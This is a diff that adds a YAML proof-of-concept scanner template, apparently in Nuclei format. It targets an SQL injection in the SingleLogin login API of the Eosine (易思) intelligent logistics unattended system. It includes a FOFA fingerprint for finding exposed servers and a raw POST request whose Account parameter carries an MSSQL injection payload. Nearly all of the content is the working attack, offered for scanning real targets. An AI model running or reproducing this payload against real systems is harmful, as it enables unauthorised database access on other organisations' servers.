@@ -1,0 +1,29 @@
+id: poc-ntnq5sgpimfcqnqf
+info:
+  name: 易思智能物流无人值守系统 SingleLogin 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntnq5sgpimfcqnqf'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ntnq5sgpimfcqnqf
+    fofa: body="eosine_login_error"
+http:
+- raw:
+  - 'POST /api/SingleLogin/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+    LoginUserType=0&DeviceType=2&Account=1''%20and%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123''))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
